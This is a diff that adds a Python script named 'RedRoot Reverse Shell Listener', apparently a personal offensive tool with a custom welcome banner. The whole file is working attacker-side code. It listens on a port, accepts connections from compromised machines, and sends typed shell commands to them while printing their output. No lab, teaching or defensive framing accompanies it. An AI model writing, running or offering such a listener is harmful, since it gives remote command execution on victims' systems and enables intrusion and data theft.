@@ -1,0 +1,79 @@
+import socket
+import threading
+import argparse
+import time
+import os
+from rich.console import Console
+from rich.text import Text
+
+console = Console()
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def animate_typing_banner():
+    clear()
+    message = "Welcome Mr. Agampreet"
+    colors = ["red", "gold1"]
+    styled_text = Text()
+    for i, char in enumerate(message):
+        color = colors[i % 2]
+        styled_text.append(char, style=f"bold {color}")
+        console.print(styled_text, end="\r", soft_wrap=True)
+        time.sleep(0.03)
+    console.print()
+    time.sleep(0.2)
+
+def handle_client(client_socket, address):
+    console.print(f"[bold green][+] Connection received from[/bold green] {address[0]}:{address[1]}")
+    try:
+        while True:
+            cmd = console.input("[bold cyan]Shell> [/bold cyan]")
+            if cmd.strip() == "":
+                continue
+            client_socket.send(cmd.encode() + b'\n')
+
+            client_socket.settimeout(1.0)  # Set short timeout
+            data = b""
+            try:
+                while True:
+                    chunk = client_socket.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+            except socket.timeout:
+                pass  # End of command output
+            finally:
+                client_socket.settimeout(None)
+
+            if data:
+                console.print(data.decode(errors='ignore'), end='')
+            else:
+                console.print("[bold red]No output or command failed.[/bold red]")
+    except Exception:
+        console.print(f"[bold red][!] Connection with {address[0]} closed.[/bold red]")
+    finally:
+        client_socket.close()
+
+def start_listener(host, port):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen(1)
+    console.print(f"[bold yellow][*] Listening on {host}:{port} ...[/bold yellow]")
+    try:
+        while True:
+            client_socket, addr = server.accept()
+            thread = threading.Thread(target=handle_client, args=(client_socket, addr))
+            thread.start()
+    except KeyboardInterrupt:
+        console.print("\n[bold red][!] User interrupted. Exiting...[/bold red]")
+        server.close()
+        exit(0)
+
+if __name__ == "__main__":
+    animate_typing_banner()
+    parser = argparse.ArgumentParser(description="RedRoot Reverse Shell Listener")
+    parser.add_argument('--host', default='0.0.0.0', help='IP to bind (default: 0.0.0.0)')
+    parser.add_argument('--port', type=int, required=True, help='Port to listen on')
+    args = parser.parse_args()
+    start_listener(args.host, args.port)
